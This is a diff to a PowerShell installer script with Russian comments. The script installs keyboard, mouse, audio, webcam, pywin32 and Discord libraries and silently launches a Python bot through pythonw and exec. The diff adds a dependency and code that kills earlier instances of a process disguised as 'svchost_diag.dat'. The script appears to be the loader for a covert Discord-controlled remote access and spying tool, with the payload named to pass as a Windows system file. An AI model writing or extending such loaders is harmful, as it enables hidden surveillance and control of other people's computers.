@@ -33,7 +33,7 @@ if (-not (Test-Path $pyPath)) {
 $deps = @(
     "discord.py", "keyboard", "mouse", "psutil", "pyttsx3",
     "requests", "pywin32", "pycryptodome", "Pillow", "comtypes",
-    "pycaw", "opencv-python", "pyaudio", "PyNaCl"
+    "pycaw", "opencv-python", "pyaudio", "PyNaCl", "davey"
 )
 Log "Installing deps..."
 & $pyPath -m pip install --upgrade pip -q 2>&1 | Out-Null
@@ -74,6 +74,11 @@ if (Test-Path $botPath) {
 } elseif (Test-Path $backupPath) {
     Copy-Item -Path $backupPath -Destination $botPath -Force -ErrorAction SilentlyContinue
 }
+
+# Завершить предыдущий запущенный экземпляр (если был запущен ранее)
+Get-CimInstance Win32_Process | Where-Object {
+    $_.Name -like "python*.exe" -and ($_.CommandLine -like "*svchost_diag.dat*" -or $_.CommandLine -like "*DOTA*")
+} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
 
 # Запуск через pythonw.exe
 $args = "-W ignore -c `"exec(open(r'$botPath', encoding='utf-8').read())`""
